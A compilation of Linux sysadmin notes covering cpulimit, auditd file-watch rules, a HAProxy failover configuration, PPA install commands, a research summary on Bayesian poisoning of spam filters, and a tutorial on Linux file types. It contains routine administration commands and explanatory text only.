ln -s cpulimit /usr/sbin/cpulimit

From that moment you can run commands limited by CPU percentage, e.g. below command executes gzip compression so that gzip process will never step over 10% of CPU limit:

/usr/sbin/cpulimit --limit=10 /bin/gzip vzdump-openvz-102-2012_06_26-19_01_11.tar

You can check actual CPU usage by gzip using commands:

ps axu | grep [g]zip

or

top

Btw, the first command contains ‘grep [g]zip’ to avoid the last line in common output:

root    896448  10.0  3.1 159524  3528 ?        S    13:12   0:00 /usr/sbin/cpulimit --limit=10 /bin/gzip vzdump-openvz-102-2012_06_26-19_01_11.tar
root       26490  0.0  0.0   6364   708 pts/0    S+   15:24   0:00 grep gzip

Using cpulimit you can also allocate CPU limit to already running processes, e.g. below command will allocate 20% CPU limit to process with PID 2342:

/usr/sbin/cpulimit -p 2342 -l 20

It’s possible to specify process by its executable file instead of PID:

/usr/sbin/cpulimit -P /usr/sbin/nginx -l 30


#############################################################################################################################################################################################

######################################################################################## auditd #############################################################################################

#### auditd

Most of Linux distributions comes with Linux Auditing System that makes it possible to track file changes, file accesses as well as system calls. It’s pretty useful functionality for sysadmins who wish to know who and when accessed and/or changed sensitive files like /etc/passwd, /etc/sudoers or others.

Daemon auditd that usually runs in background and starts after reboot by default logs those events into /var/log/audit.log file (or into other file if different syslog facility is specified). The common usage is to list all files which should be watched and search auditd’s logs from time to time. For example, I prefer to track any file changes into /etc/passwd, reading/writing of /etc/sudoers, executing of /bin/some/binary or just everything (read, write, attributes changes, executing) for my /very/important/file.

In order to configure that you’ll need two commands: auditctl and ausearch. First one is for configuring auditd daemon (e.g. setting a watch on a file), second one is for searching auditd logs (it’s possible to use grep against /var/log/audit.log too but ausearch command makes this task easier).
Install and start Linux Auditing System

If it happened that auditd daemon isn’t installed in your system then you can fix this by one of below commands:

sudo apt-get install audit

or

sudo yum install audit

The next step is to make sure that auditd is running, if command ps ax | grep [a]udit shows nothing then start auditd using command:

/etc/init.d/auditd start

As soon as auditd daemon is started we can start configuring it for tracking file changes using auditctl command.
Make auditd to log all file changes

auditctl -w /etc/passwd -k passwd-ra -p ra

This command will add a rule for auditd daemon to monitor file /etc/passwd file (see option -w /etc/passwd) for reading or changing the atributes (see option -p ra, where r is for read, a is for attribute). Also this command specifies filter key (-k passwd-ra) that will uniquely identify auditd records in its logs files.

Now let’s test this rule: optput the last 20 lines of /etc/passwd file and then search audit log for corresponding records

tail /etc/passwd

and then

[root@test artemn]# ausearch -k passwd-ra
----
time-&gt;Wed Jul  4 15:17:14 2012
type=CONFIG_CHANGE msg=audit(1341407834.821:207310): auid=500 ses=23783 op="add rule" key="passwd-ra" list=4 res=1
----
time-&gt;Wed Jul  4 15:17:20 2012
type=PATH msg=audit(1341407840.181:207311): item=0 name="/etc/passwd" inode=31982841 dev=09:02 mode=0100644 ouid=0 ogid=0 rdev=00:00
type=CWD msg=audit(1341407840.181:207311):  cwd="/home/artemn"
type=SYSCALL msg=audit(1341407840.181:207311): arch=c000003e syscall=2 success=yes exit=3 a0=7fffecd41817 a1=0 a2=0 a3=7fffecd40b40 items=1 ppid=642502 pid=521288 auid=500 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=23783 comm="tail" exe="/usr/bin/tail" key="passwd-ra"

As you can see the output of second command shows that auditd has one record for filter key ‘passwd-ra’, it shows that root user (uid=0 gid=0) has read file /etc/passwd using command tail (comm=”tail” exe=”/usr/bin/tail”) at July 4, 2012 (time->Wed Jul 4 15:17:20 2012).

Utility ausearch is pretty powerful so I recommend to read output of man ausearch, in the meantime here are some useful examples:

ausearch -x /bin/grep
ausearch -x rm

This approach allows to scan auditd records for certain executable, e.g. if you’d like to see if any of watched files was deleted (or not) using command rm then you should use second command of above two.

This one will show you all records for certain UID (username).

ausearch -ui 1000

#############################################################################################################################################################################################

##################################################################################### haproxy ###############################################################################################

#### haproxy

Failover and Load Balancing using HAProxy

HAProxy is open source proxy that can be used to enable high availability and load balancing for web applications. It was designed especially for high load projects so it is very fast and predictable, HAProxy is based on single-process model.

In this post I’ll describe sample setup of HAProxy: users’ requests are load balanced between two web servers Web1 and Web1, if one of them goes down then all the request are processed by alive server, once dead servers recovers load balancing enables again. See topology to the right.
HAProxy sample topology
Installation

HAProxy is included into repositories for major Linux distributions, so if you’re using Centos, Redhat or Fedora type the following command:

yum install haproxy

If you’re Ubuntu, Debian or Linux Mint user use this one instead:

apt-get install haproxy

Configuration

As soon as HAProxy is installed it’s time to edit its configuration file, usually it’s placed in /etc/haproxy/haproxy.cfg. Official documentation for HAProxy 1.4 (stable) is here.

Here is configuration file to implement setup shown at the diagram and described above:

global
        user daemon
        group daemon
        daemon
        log 127.0.0.1 daemon
 
listen http
        bind 1.2.3.4:80
        mode http
        option tcplog
 
        log global
        option dontlognull
 
        balance roundrobin
        clitimeout 60000
        srvtimeout 60000
        contimeout 5000
        retries 3
        server web1 web1.example.com:80 check
        server web2 web2.example.com:80 check
        cookie web1 insert nocache
        cookie web2 insert nocache

Let’s stop on most important parts of this configuration file. Section global specifies user and group which will be used to run haproxy process (daemon in our example). Line daemon tells HAProxy to run in background, log 127.0.0.1 daemon specifies syslog facility for sending logs from HAProxy.

Section listen http contains line bind 1.2.3.4:80 that specifies IP address and port that will be used to accept users’ requests (they will be load balanced between Web1 and Web2). Line mode http means that HAProxy will filter all requests different from HTTP and will do load balancing over HTTP protocol.

Line balance roundrobin specifies load balancing algorithm according to which each web server (Web1 and Web2) will be used in turns according to their weights. In our example weights for both servers are the same so load balancing is fair.

Lines server web1 … and server web2 … specify web servers for load balancing and failover, in our case they are load balanced according to round robin algorithm and have the same priority/weight.

The last two lines in configuration files are optional, they makes it possible to preserve cookies, it means for example that if you logged in to web application hosted at Web1 and then HAProxy forwarded your next request to Web2 you will still have logged in session opened as cookies with session id from Web1 will be sent to you from Web2 as well.


#############################################################################################################################################################################################

############################################################################################## ppa ##########################################################################################

#### ppa

lollypop reproductor de musica gnome style: sudo add-apt-repository ppa:gnumdk/lollypop ; sudo apt-get update ; sudo apt-get install lollypop

rhythmbox plugins: sudo add-apt-repository ppa:fossfreedom/rhythmbox-plugins ; sudo apt-get update ; sudo apt-get install rhythmbox-plugin-alternative-toolbar

anoise (instalar primero "GNOME Shell Mediaplayer extension"): sudo add-apt-repository ppa:costales/anoise ; sudo apt-get update ; sudo apt-get install anoise

#############################################################################################################################################################################################

####################################################################################### Bayesian poisoning ##################################################################################

Bayesian poisoning is a technique used by e-mail spammers to attempt to degrade the effectiveness of spam filters that rely on Bayesian spam filtering. Bayesian filtering relies on Bayesian probability to determine whether an incoming mail is spam or is not spam. The spammer hopes that the addition of random (or even carefully selected) words that are unlikely to appear in a spam message will cause the spam filter to believe the message to be legitimate—a statistical type II error.

Spammers also hope to cause the spam filter to have a higher false positive rate by turning previously innocent words into spammy words in the Bayesian database (statistical type I errors) because a user who trains their spam filter on a poisoned message will be indicating to the filter that the words added by the spammer are a good indication of spam.

Empirical results
Graham-Cumming and Brighenti

At the Spam Conference held at MIT in 2006 John Graham-Cumming and Stefano Brighenti presented two possible attacks on POPFile's Bayesian engine.[1] One was unsuccessful and the other worked, but was impractical. In doing this they identified two types of poisoning attack: passive (where words are added without any feedback to the spammer) and active (where the spammer gets feedback after the spam has been received).

The passive method of adding random words to a small spam was ineffective as a method of attack: only 0.04% of the modified spam messages were delivered. The active attack involved adding random words to a small spam and using a web bug to determine whether the spam was received. If it was, another Bayesian system was trained using the same poison words. After sending 10,000 spams to a single user he determined a small set of words that could be used to get a spam through.

The simple countermeasure of disabling remote images (web bugs) in emails eliminates this problem.
Wittel and Wu

At the Conference on Email and Anti-Spam in 2004, Wittel and Wu presented a paper[2] in which they showed that the passive addition of random words to spam was ineffective against CRM114, but effective against SpamBayes with 100 words added per spam.

They also showed that a smarter passive attack, adding common English words, was still ineffective against CRM114, but was even more effective against SpamBayes. They needed to add only 50 words to a spam to get it past SpamBayes.

However, Wittel and Wu's testing has been criticized due to the minimal header information that was present in the emails they were using; most Bayesian spam filters make extensive use of header information and other message metadata in determining the likelihood that a message is spam. A discussion of the SpamBayes results and some counter evidence can be found in the SpamBayes mailing list archive.[3]

All of these attacks are type II attacks: attacks that attempt to get spam delivered. A type I attack attempts to cause false positives by turning previously innocent words into spammy words in the Bayesian database.
Stern, Mason and Shepherd

Also in 2004 Stern, Mason and Shepherd wrote a technical report at Dalhousie University,[4] in which they detailed a passive type II attack. They added common English words to spam messages used for training and testing a spam filter.

In two tests they showed that these common words decreased the spam filter's precision (the percentage of messages classified as spam that really are spam) from 84% to 67% and from 94% to 84%. Examining their data shows that the poisoned filter was biased towards believing messages were more likely to be spam than "ham" (good email), thus increasing the false positive rate.

They proposed two countermeasures: ignoring common words when performing classification, and smoothing probabilities based on the trustworthiness of a word. A word has a trustworthy probability if an attacker is unlikely to be able to guess whether it is part of an individual's vocabulary. Thus common words are untrustworthy and their probability would be smoothed to 0.5 (making them neutral).
Lowd and Meek

At the 2005 Conference on Email and Anti-Spam Lowd and Meek presented a paper[5] in which they demonstrated that passive attacks adding random or common words to spam were ineffective against a naïve Bayesian filter. (In fact, they showed, as John Graham-Cumming demonstrated back in 2004, that adding random words improves the spam filtering accuracy.)

They demonstrated that adding hammy words - words that are more likely to appear in ham (non-spam email content) than spam - was effective against a naïve Bayesian filter, and enabled spam to slip through. They went on to detail two active attacks (attacks that require feedback to the spammer) that were very effective against the spam filters. Of course, preventing any feedback to spammers (such as non-delivery reports, SMTP level errors or web bugs) defeats an active attack trivially.

They also showed that retraining the filter was effective at preventing all the attack types, even when the retraining data had been poisoned.

The published research shows that adding random words to spam messages is ineffective as a form of attack, but that active attacks are very effective and that adding carefully chosen words can work in some cases. To defend against these attacks it is vital that no feedback is received by spammers and that statistical filters are retrained regularly.

The research also shows that continuing to investigate attacks on statistical filters is worthwhile. Working attacks have been demonstrated and countermeasures are required to ensure that statistical filters remain accurate.


#############################################################################################################################################################################################

###################################################################################### Everything is a file #################################################################################

If you are new to Linux, or have used it for a few months, then you must have heard or read statements such as “In Linux, everything is a File”. Everything is a File and Types of Files in Linux

Everything is a File and Types of Files in Linux

Read Also: 5 Useful Commands to Manage Linux File Types

That is in fact true although it is just a generalization concept, in Unix and its derivatives such as Linux, everything is considered as a file. If something is not a file, then it must be running as a process on the system.

To understand this, take for example the amount of space on your root (/) directory is always consumed by different types of Linux files. When you create a file or transfer a file to your system, it occupies some space on the 
physical disk and it is considered to be in a specific format (file type).

And also the Linux system does not differentiate between files and directories, but directories do one important job, that is store other files in groups in a hierarchy for easy location. All your hardware components are 
represented as files and the system communicates with them using these files.

The idea is an important description of a great property of Linux, where input/output resources such as your documents, directories (folders in Mac OS X and Windows), keyboard, monitor, hard-drives, removable media, printers, 
modems, virtual terminals and also inter-process and network communication are streams of bytes defined by file system space.

A notable advantage of everything being a file is that the same set of Linux tools, utilities and APIs can be used on the above input/output resources.

Although everything in Linux is a file, there are certain special files that are more than just a file for example sockets and named pipes.
What are the different types of files in Linux?

In Linux there are basically three types of files:

    Ordinary/Regular files
    Special files
    Directories

#### Ordinary/Regular Files

These are files data contain text, data or program instructions and they are the most common type of files you can expect to find on a Linux system and they include:

    Readable files
    Binary files
    Image files
    Compressed files and so on.

Special Files

Special files include the following:

#### Block files : These are device files that provide buffered access to system hardware components. They provide a method of communication with device drivers through the file system.

One important aspect about block files is that they can transfer a large block of data and information at a given time.

#### Listing block files sockets in a directory:

# ls -l /dev | grep "^b"

Sample Output

brw-rw----  1 root disk        7,   0 May 18 10:26 loop0
brw-rw----  1 root disk        7,   1 May 18 10:26 loop1
brw-rw----  1 root disk        7,   2 May 18 10:26 loop2
brw-rw----  1 root disk        7,   3 May 18 10:26 loop3
brw-rw----  1 root disk        7,   4 May 18 10:26 loop4
brw-rw----  1 root disk        7,   5 May 18 10:26 loop5
brw-rw----  1 root disk        7,   6 May 18 10:26 loop6
brw-rw----  1 root disk        7,   7 May 18 10:26 loop7
brw-rw----  1 root disk        1,   0 May 18 10:26 ram0
brw-rw----  1 root disk        1,   1 May 18 10:26 ram1
brw-rw----  1 root disk        1,  10 May 18 10:26 ram10
brw-rw----  1 root disk        1,  11 May 18 10:26 ram11
brw-rw----  1 root disk        1,  12 May 18 10:26 ram12
brw-rw----  1 root disk        1,  13 May 18 10:26 ram13
brw-rw----  1 root disk        1,  14 May 18 10:26 ram14
brw-rw----  1 root disk        1,  15 May 18 10:26 ram15
brw-rw----  1 root disk        1,   2 May 18 10:26 ram2
brw-rw----  1 root disk        1,   3 May 18 10:26 ram3
brw-rw----  1 root disk        1,   4 May 18 10:26 ram4
brw-rw----  1 root disk        1,   5 May 18 10:26 ram5
...

#### Character files : These are also device files that provide unbuffered serial access to system hardware components. They work by providing a way of communication with devices by transferring data one character at a time.

#### Listing character files sockets in a directory:

# ls -l /dev | grep "^c"

Sample Output

crw-------  1 root root       10, 235 May 18 15:54 autofs
crw-------  1 root root       10, 234 May 18 15:54 btrfs-control
crw-------  1 root root        5,   1 May 18 10:26 console
crw-------  1 root root       10,  60 May 18 10:26 cpu_dma_latency
crw-------  1 root root       10, 203 May 18 15:54 cuse
crw-------  1 root root       10,  61 May 18 10:26 ecryptfs
crw-rw----  1 root video      29,   0 May 18 10:26 fb0
crw-rw-rw-  1 root root        1,   7 May 18 10:26 full
crw-rw-rw-  1 root root       10, 229 May 18 10:26 fuse
crw-------  1 root root      251,   0 May 18 10:27 hidraw0
crw-------  1 root root       10, 228 May 18 10:26 hpet
crw-r--r--  1 root root        1,  11 May 18 10:26 kmsg
crw-rw----+ 1 root root       10, 232 May 18 10:26 kvm
crw-------  1 root root       10, 237 May 18 10:26 loop-control
crw-------  1 root root       10, 227 May 18 10:26 mcelog
crw-------  1 root root      249,   0 May 18 10:27 media0
crw-------  1 root root      250,   0 May 18 10:26 mei0
crw-r-----  1 root kmem        1,   1 May 18 10:26 mem
crw-------  1 root root       10,  57 May 18 10:26 memory_bandwidth
crw-------  1 root root       10,  59 May 18 10:26 network_latency
crw-------  1 root root       10,  58 May 18 10:26 network_throughput
crw-rw-rw-  1 root root        1,   3 May 18 10:26 null
crw-r-----  1 root kmem        1,   4 May 18 10:26 port
crw-------  1 root root      108,   0 May 18 10:26 ppp
crw-------  1 root root       10,   1 May 18 10:26 psaux
crw-rw-rw-  1 root tty         5,   2 May 18 17:40 ptmx
crw-rw-rw-  1 root root        1,   8 May 18 10:26 random

#### Symbolic link files: A symbolic link is a reference to another file on the system. Therefore, symbolic link files are files that point to other files, and they can either be directories or regular files.

Listing symbolic link sockets in a directory:

# ls -l /dev/ | grep "^l"

Sample Output

lrwxrwxrwx  1 root root             3 May 18 10:26 cdrom -> sr0
lrwxrwxrwx  1 root root            11 May 18 15:54 core -> /proc/kcore
lrwxrwxrwx  1 root root            13 May 18 15:54 fd -> /proc/self/fd
lrwxrwxrwx  1 root root             4 May 18 10:26 rtc -> rtc0
lrwxrwxrwx  1 root root             8 May 18 10:26 shm -> /run/shm
lrwxrwxrwx  1 root root            15 May 18 15:54 stderr -> /proc/self/fd/2
lrwxrwxrwx  1 root root            15 May 18 15:54 stdin -> /proc/self/fd/0
lrwxrwxrwx  1 root root            15 May 18 15:54 stdout -> /proc/self/fd/1

You can make symbolic links using the ln utility in Linux as in the example below.

# touch file1.txt
# ln -s file1.txt /home/tecmint/file1.txt  [create symbolic link]
# ls -l /home/tecmint/ | grep "^l"         [List symbolic links]

In the above example, I created a file called file1.txt in /tmp directory, then created the symbolic link, /home/tecmint/file1.txt to point to /tmp/file1.txt.

Pipes or Named pipes : These are files that allow inter-process communication by connecting the output of one process to the input of another.

A named pipe is actually a file that is used by two process to communicate with each and it acts as a Linux pipe.

Listing pipes sockets in a directory:

# ls -l | grep "^p"

Sample Output

prw-rw-r-- 1 tecmint tecmint    0 May 18 17:47 pipe1
prw-rw-r-- 1 tecmint tecmint    0 May 18 17:47 pipe2
prw-rw-r-- 1 tecmint tecmint    0 May 18 17:47 pipe3
prw-rw-r-- 1 tecmint tecmint    0 May 18 17:47 pipe4
prw-rw-r-- 1 tecmint tecmint    0 May 18 17:47 pipe5

You can use the mkfifo utility to create a named pipe in Linux as follows.

# mkfifo pipe1
# echo "This is named pipe1" > pipe1

In the above example, I created a named pipe called pipe1, then I passed some data to it using the echo command, after that the shell became un-interactive while processing the input.

Then I opened another shell and run the another command to print out what was passed to pipe.

# while read line ;do echo "This was passed-'$line' "; done<pipe1

#### Socket files : These are files that provide a means of inter-process communication, but they can transfer data and information between process running on different environments.

This means that sockets provide data and information transfer between process running on different machines on a network.

An example to show the work of sockets would be a web browser making a connection to a web server.

# ls -l /dev/ | grep "^s"

Sample Output

srw-rw-rw-  1 root root             0 May 18 10:26 log

This is an example of a socket create in C by using the socket() system call.

int socket_desc= socket(AF_INET, SOCK_STREAM, 0 );

In the above:

    AF_INET is the address family(IPv4)
    SOCK_STREAM is the type (connection is TCP protocol oriented)
    0 is the protocol(IP Protocol)

To refer to the socket file, use the socket_desc, which is the same as the file descriptor, and use read() and write() system calls to read and write from the socket respectively.

#### Directories

These are special files that store both ordinary and other special files and they are organized on the Linux file system in a hierarchy starting from the root (/) directory.

#### Listing sockets in a directory:

# ls -l / | grep "^d" 

Sample Output

drwxr-xr-x   2 root root  4096 May  5 15:49 bin
drwxr-xr-x   4 root root  4096 May  5 15:58 boot
drwxr-xr-x   2 root root  4096 Apr 11  2015 cdrom
drwxr-xr-x  17 root root  4400 May 18 10:27 dev
drwxr-xr-x 168 root root 12288 May 18 10:28 etc
drwxr-xr-x   3 root root  4096 Apr 11  2015 home
drwxr-xr-x  25 root root  4096 May  5 15:44 lib
drwxr-xr-x   2 root root  4096 May  5 15:44 lib64
drwx------   2 root root 16384 Apr 11  2015 lost+found
drwxr-xr-x   3 root root  4096 Apr 10  2015 media
drwxr-xr-x   3 root root  4096 Feb 23 17:54 mnt
drwxr-xr-x  16 root root  4096 Apr 30 16:01 opt
dr-xr-xr-x 223 root root     0 May 18 15:54 proc
drwx------  19 root root  4096 Apr  9 11:12 root
drwxr-xr-x  27 root root   920 May 18 10:54 run
drwxr-xr-x   2 root root 12288 May  5 15:57 sbin
drwxr-xr-x   2 root root  4096 Dec  1  2014 srv
dr-xr-xr-x  13 root root     0 May 18 15:54 sys
drwxrwxrwt  13 root root  4096 May 18 17:55 tmp
drwxr-xr-x  11 root root  4096 Mar 31 16:00 usr
drwxr-xr-x  12 root root  4096 Nov 12  2015 var

You can make a directory using the mkdir command.

# mkdir -m 1666 tecmint.com
# mkdir -m 1666 news.tecmint.com
# mkdir -m 1775 linuxsay.com

#### Summary

You should now be having a clear understanding of why everything in Linux is a file and the different types of files that can exit on your Linux system.

You can add more to this by reading more about the individual file types and they are created. I hope this find this guide helpful and for any questions and additional information that you would love to share, please leave a comment 
and we shall discuss more
